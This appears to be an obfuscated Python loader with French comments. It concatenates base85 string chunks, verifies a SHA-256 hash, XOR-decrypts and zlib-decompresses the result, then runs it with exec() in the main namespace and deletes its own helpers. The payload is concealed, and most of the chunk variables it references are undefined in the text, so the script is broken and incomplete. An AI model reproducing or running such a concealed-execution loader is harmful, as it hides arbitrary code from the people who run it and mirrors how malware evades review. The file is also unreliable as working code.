_cdLGI9hRlUEEo9 = '4O^>OY^c9bm<D415Q<)-w`S8(o_Of{-3ri$|xo8&8(p2GK0f=wTk?m'
_cq0ihMNZa3X5XG = 'WZ=h#P`dsl*1gN<Q;`y48wuUJ$;|YeuG-(wu^BNKIBMP{l1mTF;(3>'
_cayxuXVOfiFNbA = 'bfG=P?10pJ5(`8W0!@dtOt<W`fJ?=7q1x*lf-*j2#0*N5aKL${G)*L'
_cp0sLkp62Tysp6 = '}2V|<Y=zScC29n+^js&`F(Tl2<l`VnTUXvDYCs}h|w8#78B?+W^ooM'
_caXKgraZc7tzNY = 'EmTW$c#wuB;Z{VC+}k<O&7$1pQqlG}9(@WM7awghp7pr6qq&W*wU)~'
_cdkuO1tb07KvBU = 'm@|e`lO_z#lMMF4LO=wATyEuI)uXkchlG)ak9?(Vq+tbPN~g9^R*rO'
_cqT3FZ3gB9jhqf = 'LffbBai7)&RyzGSdZ7c3F0xsIR%QypywrxXc!(+#ZV3_?o=2XzoK!T'
_clTx6PLwJGg5xZ = 'Nd}aFKji*NGyBmVn&5RvXspAw1YhYwzY;Ld_iwfpe@8Fi1_?i5<#z8'
_cmARjJ7petRUnX = '&-1>^V-S5}<E;Iimev2Dmmz<OcZ%NoSAAk#1IVoh51{5d;6J`p=@4)'
_cpe2NMfgUta5Ty = 'R_1PMX%mpi0(S*_(MN=Bb+AB$bJvX*e71SfF{J=Z_GjN?tBZ^kirY>'
_cdXyufBgZVLUge = 'ni9JYGN~?_4MtJ!?tSRR--ux+{vxxeB!)AJN-=!@!$XX!X-se@t?3j'
_ctpHIBHrp3p4GE = '+5H|klVUmg(!*gZa-`Mys)>-*p6lmpF^yF{D#wF)+D`4N#~%XxT{)k'
_cj62NgCpWjhWHZ = '(aR1^Rrvs7hJS1*hURBl@F<l`HOV7K(a*_9Kku;jC;5;rKS!NSQNi6'
_cdvt1ToLZ4Gqoh = '(xyxmPJ?``iwKdT{=3hg{&hg|_cXvAbddszM0ot$6;R>aQInNQdr%~'
_cuu8FsQ3LScBYv = '6WjV-EDHh21-w?$aGeri1waM@8#nIdy;|I#LhDXbafHOZ%ceYGNk+v'
_cd9EYRqOp2Yoi_ = 'H#EKjWk|YBhRxIRd5@<Cyun_i+rXd(*Y-kNssycg}(m<O^&pD_I>2A'
_czggYwKdKoCpJV = 'NXs_*l2&VxHHyGS3&+^)J|$i>30Q`53HPOaqx;x;!V%)j#v1VFm+#0'
_ctvOIlWoGcpo4r = 'qY&#%SN=okWWoq(y%osB-i(qgd5ZXhZ@@P~n~}a9^;@xQ(RSv^S+OL'
_ceIyJvn9aFInE0 = ';5>MSsRMshq%UgT~Td#%qBK<YE;ikScxj3|Pq4&*3ZnkQRy3ftOFj)'
_cnnrU_l3FL_hSZ = 'Nf+OQhA(#82M81-o<??Qs^miM4$8>QEH>aCnHIWr|--Gu'

_pqFjtlg1r3vpNk = __import__('base64').b85decode(_ceEuxdxSmho75O + _cfMHqb7EuXv49l + _ckkzrjPX_3_mJz + _cwxI3u8jNpnetF + _cmzVylhHaAqV23 + _cidydg3_EszjUV + _ctWdfw7Qr3BTCB + _cxWZTjFNkNWNFP + _cgORajnAENNxdm + _ckTb2BT2Ev4LaP + _ccbCwtgKK80s7r + _chc0fSTO_I8T8g + _cwiJYyRNxtVSfj + _ck4_pdlqpYb3Zd + _cn5OvMo57uHuTl + _cs8ng5WpWxb2Ih + _cqigXMHzzzglVV + _cwaxpDCME2sxUW + _cawmiuDhClyW7p + _czjqzMAqYbAPUt + _czUMv9rPHLYPfc + _cjJQ0IAHDvDoDm + _cs56gFIE853QM6 + _caxuJKlBbRNQDm + _chOAhYcuglRxpV + _cszm5lfYkFOyI6 + _cv4h4QQzlDdvYw + _cnqSXMiD19Tnw3 + _ciN79iMKpjcpbV + _co3M1l4y2QkZzF + _cv9Mlwx7xLLEjz + _cxXa00GQKbjX8P + _ck7USdw6RKOL5v + _cbig3fPPd9X8LY + _cg2AMlwBDVdvtk + _cerpgAatM8dcoM + _cmQXQI4p88Pn0f + _cdYd4Hk6Afayu2 + _cgXpo7zaMhV_kr + _cq6N8eDVXqAMYD + _ckcIG1jBHN5G1O + _ctdIPbk5cjh3XD + _cgld0alB1RzBMm + _cjiY6OwRzyK_I6 + _c_8TZOOMtyYYxg + _cbMC597Y9MHxfo + _cyJm6OrRUBmdbg + _crLnsjU_fuYtcA + _cwRGWAGAz9W2RS + _cglgG0h1o9UmwU + _caOtAcbRr2J6eT + _cc_TlZJSLsuolM + _ceqFONlY1iGe_t + _clRGFe6c3UeS7P + _cb53aD3z_jow6T + _chptnH9MVeFenK + _co4XhfBsm1wput + _cgwpqW1lgSvhRZ + _cfE4ceEN706nTk + _ciXoL2uG7faY00 + _cttKGFxJ4xbgX2 + _cmNUUq3Hb9PTVb + _cbOtOBoeWjVXgs + _czdLamBLPckAb8 + _cod34n_4nOv0Ur + _ceQR7qQga1Fg8T + _cgicqRA1B7Gl5U + _cvNKXtw_Fs2HfB + _catZDFwmbFrbyd + _cgID0pn6xzpIdA + _cpr4QBbYHxdUQy + _clbHjvsGxXP6SM + _cdbFbk2c78Ktwr + _ctPrnDLztBGlat + _cxDBRFv51kJ3MW + _cymFokDPIHD9lM + _czR1kT8cq7hvQ9 + _ckQagtwiUjqvft + _cy7aQolnGmqS6c + _coQCM7T7W2L4wL + _cv00cU7GKkhDFS + _ctCrNZgKK7VOqk + _cxr2BCOk5lcqvJ + _cx8XaWQv4AVzX9 + _chI5ZYEzF8zQFk + _cl9A1vmkmbQdVl + _cdp_TUtfsrECEY + _crykbywgDndYk4 + _cxtIc0fqbmG2la + _cwlIeNc1YzgQyR + _cgmL7uuQA1wgE0 + _c_lgGL_tfjs5T6 + _crJXlvcTTKE0Q3 + _ckVcAk4myE3o2S + _cbHTnt1uHON28O + _cqYgnjlb52Q4A6 + _cjZuUTBFN5cNP8 + _cgc4beznQ_4KOF + _cdKTh_0ZwLEaA6 + _cmE76BOAb6ai9E + _cry1qtbw8TPy0T + _czrSC7hb_FAGG3 + _cpDN0Y0RPbWtLo + _cwc9ttB6Wy_HVh + _cgVLXNy20eTudv + _cocVNoFVgodEF8 + _cfPbQyZ6MuOIaV + _cpLRhlOVXnuKjz + _cs940HyPs6hvPf + _csKkOBu0jtbdkf + _cotm7_Fflhe20h + _cgNYP0NEw9yvts + _cox6WsUOMsqIgW + _cvuY_bq3YtZCC0 + _cqnzsHMkUUgg6Z + _cekWxL1Ov5gpjj + _cw32C7elKLW6ub + _cqGQ4NJkxzuiKX + _c_qlkB3GeSlT0J + _ckXVPqrz8oKCAn + _ckm86HlKE8RN4U + _chvxU0cpKqk968 + _cv9p8xoB6BIkhb + _cqIPqYWuxttbJb + _cxkuLeD7ZDeSjj + _cx6noXpX525ERC + _cxFxM4xRanY_XS + _cjlGbBOcDpWItL + _cld9evuUyWVYhq + _czqFPPtmp7Gqfv + _cbwc0lfVN0Ndn4 + _caWsdHimp9tRtW + _cpIsTUdIUmNJiR + _cxJIZiE3pZo2dS + _cgQ9mKamTtqlVA + _crrG7faiR3LilJ + _cr8M1qJNFb9dRp + _csYgShSwegRq7W + _cxT0sAtKlApAu1 + _cqwaZV1kbu2ucZ + _cvWFG7kuZe_jhn + _cezI5RBY7FHb7K + _crpGBVysThGlYX + _ceUFdpX0SyPo6l + _cyHwMrY_l7aP0h + _cdr8e0ewTd0v0g + _ce5Gu7KjPO_zQP + _coud5qsyrq1xFw + _ce67HVBMCS2fEQ + _czi5aej1zy80wd + _cl1cZkLXhV7dMt + _ckdQDUrnON_n9s + _cnKSAzYyJEZlK6 + _cskv87nKDUdAtn + _cvwkHLeNEG09vO + _ceQEAXc9EqsyMz + _cpC1OrdVhCu1zU + _ctqOsDOY77cT5t + _cbYxYD9nkl5UjD + _cs4mW9kipTSQeU + _clT8j4aeeWSYSw + _cvrOHtRPnWYbgX + _cyu1HGW6sZPOcp + _cdMgZYFJpeTn64 + _cqcZZDr7hWyZ47 + _cjj36lf01PZWpL + _cjkXocnr_lDgxt + _cduryPES4nNOPB + _chYAReKczFNEt0 + _cg95c7WJSNOIX6 + _cekX1M06PFQEmE + _c_2daCbE7rHirf + _c__dmqLaekEQkI + _cc6qZePOd5Q2Rj + _cgTXSCCj8U_qlV + _ch3gMrCIKoP0fQ + _cbb71A3a2q96_K + _cuPXmdQ2LlwGbF + _ct9X0J0tfM6vjM + _cntrQTqGwQr8UE + _cmRowjt3Oiga8Y + _cftammGDjFKYbr + _caHq2kP4sZCM4R + _cvl5V_M06rYDAR + _crGTHHySTNOQNZ + _cb5gXgxI68y4KD + _cv9M62Ug1wStc3 + _c_3nua2fxBWcJB + _cgROf3z_9ec65G + _cedhy4a37ZTTNa + _cpoLSKXEi08Sow + _ctQHOMFGCjjroq + _cvOFz_iFR0Soyw + _cln3iWIQFsSb2g + _cuC_h0d6zjEtqX + _cy2syVSHhRjFZg + _caLxXL99BKN5dV + _czTjsLHjHLVLFS + _cdLGI9hRlUEEo9 + _cq0ihMNZa3X5XG + _cayxuXVOfiFNbA + _cp0sLkp62Tysp6 + _caXKgraZc7tzNY + _cdkuO1tb07KvBU + _cqT3FZ3gB9jhqf + _clTx6PLwJGg5xZ + _cmARjJ7petRUnX + _cpe2NMfgUta5Ty + _cdXyufBgZVLUge + _ctpHIBHrp3p4GE + _cj62NgCpWjhWHZ + _cdvt1ToLZ4Gqoh + _cuu8FsQ3LScBYv + _cd9EYRqOp2Yoi_ + _czggYwKdKoCpJV + _ctvOIlWoGcpo4r + _ceIyJvn9aFInE0 + _cnnrU_l3FL_hSZ)
if __import__('hashlib').sha256(_pqFjtlg1r3vpNk).hexdigest() != 'fcfee0efac6bf8faeaf2a915efac34278e8ab3250d41bdf878db28901e74aff8':
    __import__('sys').exit(1)
_xxyBnqTcw0TFOa = bytes([192, 34, 22, 183, 16, 77, 193, 230, 198, 52, 78, 145])
_fkttGiHK7Z8FSD1 = bytes([226, 83, 197, 95, 48, 220, 253, 199, 23, 32, 188, 67])

def _fxl9N4_wqLWVged(_buSOXIS7LJ89Gi, _kg855kHaKdbp1_):
    return bytes(_buSOXIS7LJ89Gi[_i_0KDWp9tbN28G] ^ _kg855kHaKdbp1_[_i_0KDWp9tbN28G % len(_kg855kHaKdbp1_)] for _i_0KDWp9tbN28G in range(len(_buSOXIS7LJ89Gi)))

def _fdm3Oeh6s5e24Lv(_tmfCeq0WnmOPjg):
    import zlib
    return zlib.decompress(_tmfCeq0WnmOPjg) # Un seul niveau de zlib ici pour simplifier

def _fegLhmT80ZaKP2r():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xueUMueK_1Fq2x = _fxl9N4_wqLWVged(_pqFjtlg1r3vpNk, _xxyBnqTcw0TFOa)
    # 2. Décompression Zlib
    _dmCjKMQnYPnUNu = _fdm3Oeh6s5e24Lv(_xueUMueK_1Fq2x)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dmCjKMQnYPnUNu.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nxEHhgzt095fmt = _main.__dict__
    _nxEHhgzt095fmt.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nxEHhgzt095fmt)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fegLhmT80ZaKP2r()
try:
    del _fxl9N4_wqLWVged, _fdm3Oeh6s5e24Lv, _fegLhmT80ZaKP2r
    del _pqFjtlg1r3vpNk, _xxyBnqTcw0TFOa, _fkttGiHK7Z8FSD1
except:
    pass
